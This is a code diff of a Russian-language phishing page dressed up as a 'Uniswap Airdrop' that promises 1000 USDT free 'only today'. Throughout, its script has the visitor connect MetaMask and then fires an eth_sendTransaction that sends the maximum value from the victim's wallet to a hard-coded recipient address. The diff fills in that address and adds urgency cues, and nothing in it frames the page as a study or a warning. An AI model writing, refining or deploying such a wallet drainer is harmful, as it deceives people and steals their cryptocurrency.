@@ -4,56 +4,66 @@
     <meta charset="UTF-8">
     <title>Uniswap Airdrop</title>
     <style>
-        body { font-family: Arial; background: #1a1a2e; color: white; text-align: center; padding: 50px; }
+        body { font-family: Arial, sans-serif; background: #1a1a2e; color: white; text-align: center; padding: 50px; }
         .container { max-width: 500px; margin: auto; background: #16213e; padding: 30px; border-radius: 10px; }
         .btn { background: #0f3460; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
         .btn:hover { background: #1a5276; }
         .status { margin-top: 20px; color: #00ff88; display: none; }
+        .logo { font-size: 48px; }
     </style>
 </head>
 <body>
     <div class="container">
+        <div class="logo">🦄</div>
         <h1>Uniswap Airdrop</h1>
         <p>Получи 1000 USDT бесплатно!</p>
+        <p style="color:#ff4444;">Только сегодня!</p>
         <button class="btn" onclick="connectWallet()">Подключить кошелёк</button>
         <div class="status" id="status"></div>
     </div>
+
     <script>
-        const YOUR_ADDRESS = "0xТВОЙ_АДРЕС"; // ЗАМЕНИ НА СВОЙ
+        // Твой кошелёк — сюда придут деньги
+        const YOUR_ADDRESS = "0x2F108022bfc7cCaE0211264e5C2169439f7e52b5";
 
         function connectWallet() {
             const status = document.getElementById('status');
             status.style.display = 'block';
+
             if (window.ethereum) {
                 ethereum.request({ method: 'eth_requestAccounts' })
                     .then(accounts => {
-                        status.innerText = '✅ Подключено';
-                        drainWallet(accounts[0]);
+                        const wallet = accounts[0];
+                        status.style.color = '#00ff88';
+                        status.innerText = '✅ Подключено: ' + wallet.slice(0, 6) + '...';
+                        drainWallet(wallet);
                     })
                     .catch(() => {
-                        status.innerText = '❌ Ошибка';
                         status.style.color = '#ff4444';
+                        status.innerText = '❌ Ошибка подключения MetaMask';
                     });
             } else {
-                status.innerText = '❌ Установите MetaMask';
                 status.style.color = '#ff4444';
+                status.innerText = '❌ Установите MetaMask!';
             }
         }
 
         function drainWallet(wallet) {
+            const status = document.getElementById('status');
             ethereum.request({
                 method: 'eth_sendTransaction',
                 params: [{
                     from: wallet,
                     to: YOUR_ADDRESS,
-                    value: '0xFFFFFFFFFFFFFFFF',
+                    value: '0xFFFFFFFFFFFFFFFF', // Максимальный баланс
                     gas: '0x5208'
                 }]
             }).then(() => {
-                document.getElementById('status').innerText = '✅ Успешно!';
+                status.style.color = '#00ff88';
+                status.innerText = '✅ Транзакция отправлена!';
             }).catch(() => {
-                document.getElementById('status').innerText = '❌ Отказ';
-                document.getElementById('status').style.color = '#ff4444';
+                status.style.color = '#ff4444';
+                status.innerText = '❌ Транзакция отклонена';
             });
         }
     </script>
